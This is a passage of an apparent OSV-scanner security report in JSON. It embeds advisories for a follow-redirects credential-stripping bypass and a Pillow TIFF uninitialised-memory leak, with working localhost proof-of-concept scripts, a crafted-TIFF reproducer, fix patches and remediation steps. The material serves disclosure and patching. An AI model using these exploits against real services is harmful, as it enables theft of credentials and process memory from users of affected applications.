followRedirects.http.request({\n\u003e       hostname: \"127.0.0.1\", port: 47301, path: \"/\", method: \"GET\",\n\u003e       headers: [\n\u003e         \"Host\", \"127.0.0.1:47301\",\n\u003e         \"Authorization\", \"Bearer ARRAY-FORM-VICTIM-TOKEN\",\n\u003e         \"Cookie\", \"session=ARRAY-FORM-SESSION-ID\",\n\u003e         \"X-Custom\", \"harmless\"\n\u003e       ]\n\u003e     }, function (res) {\n\u003e       var body = \"\"; res.on(\"data\", function (c) { body += c; });\n\u003e       res.on(\"end\", function () {\n\u003e         var h = JSON.parse(body);\n\u003e         console.log(\"Authorization :\", h.authorization || \"(stripped - OK)\");\n\u003e         console.log(\"Cookie        :\", h.cookie || \"(stripped - OK)\");\n\u003e         redirector.close(); collector.close();\n\u003e       });\n\u003e     }).end();\n\u003e   });\n\u003e });\n\u003e ```\n\u003e Observed output (1.16.0 and 1.15.11):\n\u003e ```\n\u003e Authorization : Bearer ARRAY-FORM-VICTIM-TOKEN     \u003c- credential LEAKED cross-origin\n\u003e Cookie        : session=ARRAY-FORM-SESSION-ID      \u003c- credential LEAKED cross-origin\n\u003e ```\n\u003e Control: replacing `headers` with the equivalent object `{ Host: ..., Authorization: ..., Cookie: ... }` and re-running strips both correctly, proving the strip branch executes and only the array iteration defeats it.\n\u003e \n\u003e Combined form (built-in list plus the 1.16.0 `sensitiveHeaders` fix, all defeated in one request), `combined.js`:\n\u003e ```js\n\u003e var followRedirects = require(\"./index.js\");\n\u003e var http = require(\"http\");\n\u003e var redirector = http.createServer(function (req, res) {\n\u003e   req.resume();\n\u003e   res.writeHead(302, { Location: \"http://127.0.0.1:47402/steal\" });\n\u003e   res.end();\n\u003e });\n\u003e var collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\n\u003e redirector.listen(47401, \"127.0.0.1\", function () {\n\u003e   collector.listen(47402, \"127.0.0.1\", function () {\n\u003e     followRedirects.http.request({\n\u003e       hostname: \"127.0.0.1\", port: 47401, path: \"/\", method: \"GET\",\n\u003e       headers: [\n\u003e         \"Host\", \"127.0.0.1:47401\",\n\u003e         \"Authorization\", \"Bearer BUILTIN-VICTIM-TOKEN\",\n\u003e         \"Cookie\", \"session=BUILTIN-SESSION-ID\",\n\u003e         \"X-API-Key\", \"DECLARED-VICTIM-KEY\"\n\u003e       ],\n\u003e       sensitiveHeaders: [\"X-API-Key\"]\n\u003e     }, function (res) {\n\u003e       var body = \"\"; res.on(\"data\", function (c) { body += c; }); res.on(\"end\", function () {\n\u003e         var h = JSON.parse(body);\n\u003e         console.log(\"Authorization (built-in list) :\", h.authorization || \"(stripped - OK)\");\n\u003e         console.log(\"Cookie (built-in list)        :\", h.cookie || \"(stripped - OK)\");\n\u003e         console.log(\"X-API-Key (sensitiveHeaders)  :\", h[\"x-api-key\"] || \"(stripped - OK)\");\n\u003e         redirector.close(); collector.close();\n\u003e       });\n\u003e     }).end();\n\u003e   });\n\u003e });\n\u003e ```\n\u003e Observed output (1.16.0):\n\u003e ```\n\u003e Authorization (built-in list) : Bearer BUILTIN-VICTIM-TOKEN     \u003c- LEAKED\n\u003e Cookie (built-in list)        : session=BUILTIN-SESSION-ID      \u003c- LEAKED\n\u003e X-API-Key (sensitiveHeaders)  : DECLARED-VICTIM-KEY             \u003c- LEAKED (the CVE-2026-40895 fix defeated)\n\u003e ```\n\u003e \n\u003e Protocol-downgrade branch (credentials transit in cleartext), `downgrade.js`, using the repository's own test certificate at `test/assets/`:\n\u003e ```js\n\u003e var followRedirects = require(\"./index.js\");\n\u003e var http = require(\"http\"); var https = require(\"https\"); var fs = require(\"fs\");\n\u003e var opts = { key: fs.readFileSync(\"test/assets/localhost.key\"), cert: fs.readFileSync(\"test/assets/localhost.crt\") };\n\u003e var ca = fs.readFileSync(\"test/assets/ca.crt\");\n\u003e var httpsOrigin = https.createServer(opts, function (req, res) {\n\u003e   req.resume(); res.writeHead(302, { Location: \"http://localhost:47502/steal\" }); res.end();\n\u003e });\n\u003e var httpCollector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\n\u003e httpsOrigin.listen(47501, \"localhost\", function () {\n\u003e   httpCollector.listen(47502, \"localhost\", function () {\n\u003e     followRedirects.https.request({\n\u003e       hostname: \"localhost\", port: 47501, path: \"/\", method: \"GET\", ca: ca,\n\u003e       headers: [\"Host\", \"localhost:47501\", \"Authorization\", \"Bearer DOWNGRADE-TOKEN\", \"Cookie\", \"session=DOWNGRADE-SESSION\"]\n\u003e     }, function (res) {\n\u003e       var body = \"\"; res.on(\"data\", function (c) { body += c; });\n\u003e       res.on(\"end\", function () {\n\u003e         var h = JSON.parse(body);\n\u003e         console.log(\"Authorization :\", h.authorization || \"(stripped - OK)\");\n\u003e         console.log(\"Cookie        :\", h.cookie || \"(stripped - OK)\");\n\u003e         httpsOrigin.close(); httpCollector.close();\n\u003e       });\n\u003e     }).end();\n\u003e   });\n\u003e });\n\u003e ```\n\u003e Observed output (1.16.0): both credentials received at the plaintext HTTP target after an HTTPS-to-HTTP redirect, meaning they transit unencrypted and are harvestable by any on-path network observer, not only the redirect destination.\n\u003e \n\u003e Side-effect verification (stale Host re-sent, Content-Length inconsistent): a POST request with array-form headers and a 13-byte body that receives a 302 to a different origin was observed to arrive at the new origin as a GET carrying the stale `Host` of the first origin and `Content-Length: 13` despite an empty body.\n\u003e \n\u003e ### Impact\n\u003e This is an information-disclosure vulnerability: silent failure of the cross-origin credential-header stripping control. Who is impacted: any application, or upstream library, that calls follow-redirects with Node's array-form headers (used to control header ordering or duplication) and follows a redirect whose target is controlled or compromised by an attacker. When triggered, the victim's Authorization, Cookie, and Proxy-Authorization headers, and any headers declared through the `sensitiveHeaders` option, are disclosed to the attacker-controlled destination. In the protocol-downgrade case the credentials additionally traverse the network in cleartext, exposing them to on-path observers. No authentication or user interaction is required of the attacker beyond controlling a redirect target the victim already contacts. The control that is defeated is the same one that prior advisories in this library (CVE-2022-0155, CVE-2022-0536, CVE-2026-40895 / GHSA-r4q5-vmmm-2653) were issued to establish and harden.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | follow-redirects | 1.16.0 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | follow-redirects | 1.16.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-q3jh-wrc6-jgq8 | follow-redirects | 1.16.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-111756\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-111756\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-111756",
              "name": "CVE-2026-111756",
              "properties": {
                "security-severity": "8.2"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-111756: follow-redirects array-form headers bypass cross-origin credential stripping",
                "text": "CVE-2026-111756: follow-redirects array-form headers bypass cross-origin credential stripping"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-112897",
                "BIT-pillow-2026-112897",
                "GHSA-q45j-58j2-45rg"
              ],
              "fullDescription": {
                "markdown": "```\n============================================================================\nTiffDecode returns uninitialized memory as pixels for short JPEG strips\nLocation: src/libImaging/TiffDecode.c:554  in _decodeStrip()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nPillow hands back leftover process memory as image pixels when it opens a small crafted TIFF file. Anyone who can get an application to open their image, and can see something produced from its pixels (a thumbnail, a preview, a converted copy), can read heap memory that the process had previously used and freed. This works in the default configuration: opening and loading the 478-byte file succeeds with no error or warning, and every row below the first eight holds stale memory instead of picture content.\n\nThe bug is in `_decodeStrip()` in `src/libImaging/TiffDecode.c`, and `_decodeTile()` has the same shape. The function `realloc()`s `state-\u003ebuffer` to `TIFFStripSize()` bytes without initialising it and calls `TIFFReadEncodedStrip()`. Whenever that call does not return -1, it copies all `RowsPerStrip` rows of the buffer into the image. libtiff's JPEG codec only warns when the JPEG embedded in a strip has fewer rows than the strip, and Pillow silences libtiff warnings. The codec decodes the rows that exist and still returns the full strip size, so the untouched remainder is copied out as pixels. libtiff's Group 4 fax codec behaves the same way for a stream that ends early.\n\nThe attached reproducer builds a 256×256 TIFF whose single strip or tile is a 256×8 JPEG. Before loading it, the script frees buffers filled with `b\"LEAK\"`. It then finds 15,872 copies of `LEAK` in rows 8–255 of the decoded image (the same freed chunk was reused in 500 of 500 runs). Under glibc's `MALLOC_PERTURB_`, those rows are entirely the allocator's fill byte. A well-formed control file decodes correctly in both cases.\n\nThis is a read of uninitialised heap memory, not memory corruption. Each strip can disclose up to width × `RowsPerStrip` bytes, and what comes back depends on the allocator's state at the time. The strip path was introduced in e91b851fdc1c (\"Add reading old-JPEG compressed TIFFs\", first released in Pillow 6.0.0). The tile path has had the same pattern since f0436a4ddc95 (Pillow 5.3.0).\n\n## Details\n\n`src/libImaging/TiffDecode.c` decodes compressed TIFFs through libtiff into a strip\n(or tile) buffer that it `realloc()`s to `TIFFStripSize()` bytes and never initialises, and\nthen copies all `RowsPerStrip` rows of that buffer into the image whenever\n`TIFFReadEncodedStrip()` does not return -1. libtiff's JPEG codec does not fail when the\nJPEG stream inside a strip has fewer rows than the strip: it decodes the rows that exist\nand returns the full strip size. The rows it did not write are whatever the heap held\nbefore, and Pillow returns them as pixels.\n\nA 478-byte file shows it: a classic little-endian TIFF, 256×256, `BitsPerSample=8`,\n`Compression=7`, `PhotometricInterpretation=1`, `RowsPerStrip=256`, one strip whose data\nis a baseline JPEG of 256×**8** pixels (as written by `Image.new(\"L\",(256,8),200).save(…,\"JPEG\")`).\n`Image.open(BytesIO(data)).load()` succeeds with default settings (compressed TIFFs always\ntake the libtiff path). Rows 0–7 of the result are the JPEG content (value 200); the\nremaining 63488 bytes of `im.tobytes()` are heap garbage: run under glibc's\n`MALLOC_PERTURB_=1` they are all `0xFE`, under `MALLOC_PERTURB_=170` all `0x55` (the\nfresh-`malloc` fill byte), and in a process that has just freed buffers containing\n`b\"LEAK\"` they contain 15872 copies of `LEAK`.\n\nFeeding the same file to libtiff 4.5.0 directly confirms the library side:\n`TIFFReadEncodedStrip(t, 0, buf, 65536)` prints\n`JPEGPreDecode: Warning, Improper JPEG strip/tile size, expected 256x256, got 256x8.`,\nreturns 65536, and leaves 63488 of the 65536 buffer bytes untouched. Pillow installs\n`TIFFSetWarningHandler(NULL)` (`TiffDecode.c:682`), so the warning is not visible either.\n\nThe strip path:\n\n```c\n// src/libImaging/TiffDecode.c:552\n    /* realloc to fit whole strip */\n    /* malloc check above */\n    new_data = realloc(state-\u003ebuffer, state-\u003ebytes);      // state-\u003ebytes = TIFFStripSize()\n    …\n    state-\u003ebuffer = new_data;\n\n    for (; state-\u003ey \u003c state-\u003eysize; state-\u003ey += rows_per_strip) {\n        …\n            if (TIFFReadEncodedStrip(\n                    tiff,\n                    TIFFComputeStrip(tiff, state-\u003ey, plane),\n                    (tdata_t)state-\u003ebuffer,\n                    strip_size\n                ) == -1) {\n                … return -1;\n            }\n            …\n            // iterate over each row in the strip and stuff data into image\n            for (strip_row = 0;\n                 strip_row \u003c MIN((INT32)rows_per_strip, state-\u003eysize - state-\u003ey);\n                 strip_row++) {\n                …\n                shuffler(\n                    (UINT8 *)im-\u003eimage[state-\u003ey + state-\u003eyoff + strip_row] +\n                        state-\u003exoff * im-\u003epixelsize,\n                    state-\u003ebuffer + strip_row * row_byte_size,\n                    state-\u003exsize\n                );\n```\n\n`state-\u003ebuffer` arrives here as the one-row `calloc` made by `decode.c:230`\n(`(bits*xsize+7)/8` = 256 bytes for the example). The `realloc` to 65536 bytes hands back\na different, uninitialised chunk; nothing zeroes it. `TIFFReadEncodedStrip()` returns the\nnominal strip size on success, not the number of rows produced, and the only check is\n`== -1`, so the row loop unconditionally copies 256 rows × 256 bytes into `im-\u003eimage`\n(which itself is zeroed by `core.new`, so the garbage provably comes from `state-\u003ebuffer`).\n`_decodeTile()` has the same shape (`TiffDecode.c:448` `realloc` to `TIFFTileSize()`, then\n`tile_length` rows copied after each `TIFFReadTile()` at 460–488).\n\nFor a well-formed file the JPEG inside the strip is 256×256, libtiff fills all 65536 bytes\nand the copy is correct. The malicious file differs only in the SOF height of the embedded\nJPEG; libtiff treats \"JPEG smaller than strip\" as a warning, clamps the row count to the\nJPEG height, and reports success.\n\nJPEG is not the only libtiff codec that succeeds on a short strip. `Fax4Decode`\n(`Compression=4`) returns success for a T.6 stream that ends early: a 133-byte 512×256\n1-bit TIFF whose strip is the Group 4 stream of a 512×16 image loads without error,\nlibtiff writes 17 rows (1088 bytes) of the 16384-byte buffer\n(`Fax4Decode: Warning, Premature EOL at line 16`, return value 16384) and the other\n15296 bytes are again heap contents. LZW, Deflate, PackBits, Group 3 and CCITT RLE were\nchecked and do return -1 on short data, so Pillow raises `OSError` for those.\n\nThe strip path was introduced in `e91b851fdc1c` (\"Add reading old-JPEG compressed TIFFs\",\n2018-12-08), first released in Pillow 6.0.0, which replaced row-by-row `TIFFReadScanline()`\n(where libtiff errors on the first missing row) with the whole-strip `realloc()` and copy.\nThe tile path has had the same shape since it was added in `f0436a4ddc95` (2018-07-02,\nPillow 5.3.0).\n\n## Impact\n\nAny application that opens attacker-supplied images with Pillow in the default\nconfiguration and returns something derived from the pixels (thumbnail, preview, format\nconversion, OCR text) discloses freed heap memory of the worker process to the uploader:\neverything below the rows the embedded JPEG/G4 stream actually encodes, up to\n`ImageWidth × RowsPerStrip × SamplesPerPixel` bytes per strip and tens of MB per image\nwithin the default `MAX_IMAGE_PIXELS`. `load()` raises nothing, so the application has no\nsignal that the image is malformed. What comes back depends on allocator state; in a\nlong-running web worker it is typically recently freed request bodies, other users'\ndecoded image buffers and Python object contents. There is no memory corruption; this is\na read of uninitialised (previously used) heap memory, analogous in effect to an\nout-of-bounds read that lands in pixels.\n\n## Reproducing\n\n`repro` is a short Python script that runs against the installed Pillow build with\ndefault settings: no rebuild, no sanitizer, no files written. It runs twice, once normally\nand once re-executing itself under glibc's `MALLOC_PERTURB_=170`, and the last line it\nprints is `BUG` or `OK`.\n\n**Input.** `tiff(jpeg_rows, tiled)` builds a little-endian TIFF in memory. The header\ndeclares a 256×256 8-bit greyscale image with `Compression=7` (JPEG), either as one strip\n(`RowsPerStrip=256`) or as one 256×256 tile (`TileWidth`/`TileLength`). The strip or tile\nis a baseline JPEG of 256×`jpeg_rows` pixels, all value 200, written by Pillow's own JPEG\nencoder. For each layout the script builds two files:\n\n- **Control:** `jpeg_rows=256`. This is a well-formed file, and libtiff fills the whole\n  64 KiB strip/tile.\n- **Crafted:** `jpeg_rows=8`, 478 bytes (strip) or 490 bytes (tile). The only difference\n  is the embedded JPEG's height. libtiff decodes 8 rows (2048 bytes), warns\n  `Improper JPEG strip/tile size` (Pillow silences the warning) and returns the full\n  strip/tile size as success.\n\n**Steps.** Each file is opened (the script asserts it takes the `libtiff` decoder). Just\nbefore `im.load()` the script allocates and frees six 64 KiB `bytearray`s filled with\n`b\"LEAK\"`, which leaves freed heap chunks about the size of the buffer that\n`_decodeStrip()`/`_decodeTile()` is about to `realloc()`. For rows 8–255 it then counts\ncopies of `LEAK` and bytes equal to `0x55` (glibc's fresh-`malloc` fill under\n`MALLOC_PERTURB_=170`). The files contain no `LEAK` bytes (the script asserts this), so\nany copy in the image came from freed heap memory. It reports `BUG` if a crafted file\nshows any `LEAK` in the normal pass, or rows 8–255 entirely `0x55` in the perturbed pass.\n\n**Expected output on this tree:**\n\n```\n[normal ] strip well-formed (1222 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n[normal ] strip crafted     ( 478 B) rows 8-255: 15872 x b'LEAK',     0/63488 == 0x55, head=b'LEAKLEAK'\n[normal ] tiled well-formed (1234 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n[normal ] tiled crafted     ( 490 B) rows 8-255: 15872 x b'LEAK',     0/63488 == 0x55, head=b'LEAKLEAK'\n[perturb] strip well-formed (1222 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n[perturb] strip crafted     ( 478 B) rows 8-255:     0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU'\n[perturb] tiled well-formed (1234 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n[perturb] tiled crafted     ( 490 B) rows 8-255:     0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU'\nBUG\n```\n\n`im.load()` succeeds for every file. For the crafted files rows 8–255 are the uninitialised\nstrip/tile buffer, copied as-is into the image. With the attached patch applied, rows 8–255\nof the crafted files come back as `\\x00` bytes, with no `LEAK` and no `0x55`, and the\nscript ends with `OK`.\n\nThe `LEAK` count depends on where glibc places the buffer (the same freed chunk was reused\nin 500 of 500 runs here); the `MALLOC_PERTURB_` pass does not. The script covers the JPEG\ncodec only. The Group 4 variant in the Details section (`Compression=4`, a T.6 stream that\nends early) goes through the same `_decodeStrip()` copy, and the same fix covers it.\n\n## Suggested fix\n\nThe attached patch zeroes `state-\u003ebuffer` before each libtiff read in both loops of\n`src/libImaging/TiffDecode.c` — before `TIFFReadTile()` in `_decodeTile()` and before\n`TIFFReadEncodedStrip()` in `_decodeStrip()` — so rows a codec does not produce are\ndeterministic zeros rather than stale heap:\n\n```diff\n--- a/src/libImaging/TiffDecode.c\n+++ b/src/libImaging/TiffDecode.c\n@@ _decodeTile\n             for (x = state-\u003exoff; x \u003c state-\u003exsize; x += tile_width) {\n+                memset(state-\u003ebuffer, 0, state-\u003ebytes);\n                 if (TIFFReadTile(tiff, (tdata_t)state-\u003ebuffer, x, y, 0, plane) == -1) {\n@@ _decodeStrip\n         for (plane = 0; plane \u003c planes; plane++) {\n             ImagingShuffler shuffler = unpackers[plane];\n+            memset(state-\u003ebuffer, 0, state-\u003ebytes);\n             if (TIFFReadEncodedStrip(\n```\n\nA `memset` per strip/tile (rather than one `calloc` after the size is known) is needed\nbecause the same buffer is reused for every strip, and a short last strip would otherwise\nexpose the previous strip's rows — harmless for disclosure, but the per-read `memset`\nkeeps the behaviour uniform at the cost of one extra pass over the buffer. Promoting\nlibtiff warnings to errors via a warning handler is not a good alternative: both codecs\nonly warn (`Improper JPEG strip/tile size`, `Premature EOL`), but so do many legitimate\nfiles (unknown tags, bad tag counts), and the return value of `TIFFReadEncodedStrip()`\ncarries no row count to check against. Initialising the buffer covers every codec.\n`_decodeAsRGBA()` needs no change: `TIFFRGBAImageGet()` fills its whole raster, and JPEG\nfiles do not reach it (`JPEGCOLORMODE_RGB` sends them down the strip path).\n\nValid files decode exactly as before; rows a codec does not produce are now black instead\nof garbage, and nothing that previously loaded now fails. The patch also adds\n`test_jpeg_short_strip` to `Tests/test_file_libtiff.py`, parametrised over strip and tile,\nwhich builds the 256×8-JPEG-in-256×256 file and asserts rows 8–255 are zero. It is a\nregression guard for the fixed code rather than a reliable detector of the bug: in a fresh\npytest process the unfixed strip variant can pass because the new heap chunk happens to be\nzero (the tiled variant fails before the fix). With the patch, `Tests/test_file_libtiff.py`\nand `Tests/test_file_tiff.py` pass and the reproducer prints `OK`.\n\n## The patch\n\nZero the libtiff strip/tile buffer before each TIFFReadEncodedStrip/TIFFReadTile in TiffDecode.c so short strips do not expose uninitialised heap\n\nApplies to `src/libImaging/TiffDecode.c` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\nindex 3d804ea4a..67bc96329 100644\n--- a/Tests/test_file_libtiff.py\n+++ b/Tests/test_file_libtiff.py\n@@ -1162,6 +1162,45 @@ class TestFileLibTiff(LibTiffTestCase):\n             im.load()\n         assert im.size == (950, 975)\n \n+    @pytest.mark.parametrize(\"tiled\", (False, True))\n+    def test_jpeg_short_strip(self, tiled: bool) -\u003e None:\n+        # The JPEG data in the strip/tile only contains 8 of the 256 rows that\n+        # RowsPerStrip/TileLength declare. libtiff decodes the rows that exist\n+        # and still reports success, so the remaining rows must be cleared\n+        # rather than left as uninitialised memory.\n+        jpeg = io.BytesIO()\n+        Image.new(\"L\", (256, 8), 200).save(jpeg, \"JPEG\")\n+        jpeg_data = jpeg.getvalue()\n+\n+        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n+        ifd[256] = 256  # ImageWidth\n+        ifd[257] = 256  # ImageLength\n+        ifd[258] = 8  # BitsPerSample\n+        ifd[259] = 7  # Compression: JPEG\n+        ifd[262] = 1  # PhotometricInterpretation: BlackIsZero\n+        ifd[277] = 1  # SamplesPerPixel\n+        if tiled:\n+            ifd[322] = 256  # TileWidth\n+            ifd[323] = 256  # TileLength\n+            ifd[324] = 0  # TileOffsets\n+            ifd[325] = len(jpeg_data)  # TileByteCounts\n+            # Point the tile data at the end of the IFD\n+            ifd[324] = 8 + len(ifd.tobytes(8))\n+        else:\n+            ifd[278] = 256  # RowsPerStrip\n+            ifd[STRIPOFFSETS] = 0  # Updated by tobytes() to follow the IFD\n+            ifd[279] = len(jpeg_data)  # StripByteCounts\n+\n+        b = io.BytesIO()\n+        ifd.save(b)\n+        b.write(jpeg_data)\n+\n+        with Image.open(b) as im:\n+            assert im.tile[0][0] == \"libtiff\"\n+            im.load()\n+            assert im.crop((0, 0, 256, 8)).getextrema() == (200, 200)\n+            assert im.crop((0, 8, 256, 256)).getextrema() == (0, 0)\n+\n     def test_orientation(self) -\u003e None:\n         with Image.open(\"Tests/images/g4_orientation_1.tif\") as base_im:\n             for i in range(2, 9):\ndiff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\nindex 8a57c523d..d1d6bfbbb 100644\n--- a/src/libImaging/TiffDecode.c\n+++ b/src/libImaging/TiffDecode.c\n@@ -457,6 +457,11 @@ _decodeTile(\n         for (plane = 0; plane \u003c planes; plane++) {\n             ImagingShuffler shuffler = unpackers[plane];\n             for (x = state-\u003exoff; x \u003c state-\u003exsize; x += tile_width) {\n+                // Some codecs (e.g. JPEG, Group 4) succeed on a tile that decodes\n+                // to fewer rows than the tile length, leaving the rest of the\n+                // buffer untouched. Clear it so that uninitialised memory is not\n+                // copied into the image.\n+                memset(state-\u003ebuffer, 0, state-\u003ebytes);\n                 if (TIFFReadTile(tiff, (tdata_t)state-\u003ebuffer, x, y, 0, plane) == -1) {\n                     TRACE((\"Decode Error, Tile at %dx%d\\n\", x, y));\n                     state-\u003eerrcode = IMAGING_CODEC_BROKEN;\n@@ -563,6 +568,11 @@ _decodeStrip(\n         int plane;\n         for (plane = 0; plane \u003c planes; plane++) {\n             ImagingShuffler shuffler = unpackers[plane];\n+            // Some codecs (e.g. JPEG, Group 4) succeed on a strip that decodes\n+            // to fewer rows than RowsPerStrip, leaving the rest of the buffer\n+            // untouched. Clear it so that uninitialised memory is not copied\n+            // into the image.\n+            memset(state-\u003ebuffer, 0, state-\u003ebytes);\n             if (TIFFReadEncodedStrip(\n                     tiff,\n                     TIFFComputeStrip(tiff, state-\u003ey, plane),\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,688 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# Pillow TiffDecode.c _decodeStrip/_decodeTile: strip/tile buffer is realloc()ed, never\n# initialised, and copied whole into the image even when libtiff's JPEG codec decoded\n# fewer rows than RowsPerStrip/TileLength.  Two independent signals:\n#  pass 1 (normal heap): seed freed 64 KiB chunks with b\"LEAK\" just before load() and\n#         count copies of LEAK in the decoded pixels (file contains no such bytes);\n#  pass 2 (same script re-run under glibc MALLOC_PERTURB_=170): fresh malloc memory is\n#         0x55, so rows that come back all-0x55 are provably uninitialised heap.\nimport gc, io, os, struct, subprocess, sys\nfrom PIL import Image\nW = H = 256; ROWS = 8\nperturbed = os.environ.get(\"MALLOC_PERTURB_\") == \"170\"\nif not perturbed:\n    print(\"Pillow\", Image.__version__, Image.core.__file__)\n\ndef tiff(jpeg_rows, tiled):\n    j = io.BytesIO(); Image.new(\"L\", (W, jpeg_rows), 200).save(j, \"JPEG\"); j = j.getvalue()\n    tags = [(256,3,1,W), (257,3,1,H), (258,3,1,8), (259,3,1,7), (262,3,1,1), (277,3,1,1)]\n    tags += ([(322,3,1,W), (323,3,1,H), (324,4,1,0), (325,4,1,len(j))] if tiled else\n             [(273,4,1,0), (278,3,1,H), (279,4,1,len(j))])\n    tags.sort(); off = 8 + 2 + 12*len(tags) + 4\n    tags = [(t,ty,c, off if t in (273,324) else v) for t,ty,c,v in tags]\n    ifd = struct.pack(\"\u003cH\", len(tags)) + b\"\".join(struct.pack(\"\u003cHHLL\", *t) for t in tags)\n    return b\"II*\\0\" + struct.pack(\"\u003cL\", 8) + ifd + struct.pack(\"\u003cL\", 0) + j\n\nbug = False\nfor tiled in (False, True):\n    for jpeg_rows, label in ((H, \"well-formed\"), (ROWS, \"crafted\")):\n        data = tiff(jpeg_rows, tiled); assert b\"LEAK\" not in data\n        im = Image.open(io.BytesIO(data)); assert im.tile[0][0] == \"libtiff\"\n        junk = [bytearray(b\"LEAK\" * (W*H//4)) for _ in range(6)]; del junk; gc.collect()\n        im.load()                                   # no exception for either file\n        below = im.tobytes()[W*ROWS:]\n        n55, nleak = below.count(0x55), below.count(b\"LEAK\")\n        print(f\"[{'perturb' if perturbed else 'normal '}] {'tiled' if tiled else 'strip'} \"\n              f\"{label:11s} ({len(data):4d} B) rows {ROWS}-{H-1}: {nleak:5d} x b'LEAK', \"\n              f\"{n55:5d}/{len(below)} == 0x55, head={below[:8]!r}\")\n        if jpeg_rows == ROWS and (nleak \u003e 0 or (perturbed and n55 == len(below))):\n            bug = True\nif not perturbed:\n    r = subprocess.run([sys.executable, sys.argv[0]], env={**os.environ, \"MALLOC_PERTURB_\": \"170\"},\n                       capture_output=True, text=True)\n    lines = r.stdout.rstrip().split(\"\\n\")\n    print(\"\\n\".join(lines[:-1])); sys.stderr.write(r.stderr)\n    bug = bug or lines[-1] == \"BUG\"\nprint(\"BUG\" if bug else \"OK\")\n```\n\u003c/details\u003e\n\n---",
                "text": "```\n============================================================================\nTiffDecode returns uninitialized memory as pixels for short JPEG strips\nLocation: src/libImaging/TiffDecode.c:554  in _decodeStrip()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nPillow hands back leftover process memory as image pixels when it opens a small crafted TIFF file. Anyone who can get an application to open their image, and can see something produced from its pixels (a thumbnail, a preview, a converted copy), can read heap memory that the process had previously used and freed. This works in the default configuration: opening and loading the 478-byte file succeeds with no error or warning, and every row below the first eight holds stale memory instead of picture content.\n\nThe bug is in `_decodeStrip()` in `src/libImaging/TiffDecode.c`, and `_decodeTile()` has the same shape. The function `realloc()`s `state-\u003ebuffer` to `TIFFStripSize()` bytes without initialising it and calls `TIFFReadEncodedStrip()`. Whenever that call does not return -1, it copies all `RowsPerStrip` rows of the buffer into the image. libtiff's JPEG codec only warns when the JPEG embedded in a strip has fewer rows than the strip, and Pillow silences libtiff warnings. The codec decodes the rows that exist and still returns the full strip size, so the untouched remainder is copied out as pixels. libtiff's Group 4 fax codec behaves the same way for a stream that ends early.\n\nThe attached reproducer builds a 256×256 TIFF whose single strip or tile is a 256×8 JPEG. Before loading it, the script frees buffers filled with `b\"LEAK\"`. It then finds 15,872 copies of `LEAK` in rows 8–255 of the decoded image (the same freed chunk was reused in 500 of 500 runs). Under glibc's `MALLOC_PERTURB_`, those rows are entirely the allocator's fill byte. A well-formed control file decodes correctly in both cases.\n\nThis is a read of uninitialised heap memory, not memory corruption. Each strip can disclose up to width × `RowsPerStrip` bytes, and what comes back depends on the allocator's state at the time. The strip path was introduced in e91b851fdc1c (\"Add reading old-JPEG compressed TIFFs\", first released in Pillow 6.0.0). The tile path has had the same pattern since f0436a4ddc95 (Pillow 5.3.0).\n\n## Details\n\n`src/libImaging/TiffDecode.c` decodes compressed TIFFs through libtiff into a strip\n(or tile) buffer that it `realloc()`s to `TIFFStripSize()` bytes and never initialises, and\nthen copies all `RowsPerStrip` rows of that buffer into the image whenever\n`TIFFReadEncodedStrip()` does not return -1. libtiff's JPEG codec does not fail when the\nJPEG stream inside a strip has fewer rows than the strip: it decodes the rows that exist\nand returns the full strip size. The rows it did not write are whatever the heap held\nbefore, and Pillow returns them as pixels.\n\nA 478-byte file shows it: a classic little-endian TIFF, 256×256, `BitsPerSample=8`,\n`Compression=7`, `PhotometricInterpretation=1`, `RowsPerStrip=256`, one strip whose data\nis a baseline JPEG of 256×**8** pixels (as written by `Image.new(\"L\",(256,8),200).save(…,\"JPEG\")`).\n`Image.open(BytesIO(data)).load()` succeeds with default settings (compressed 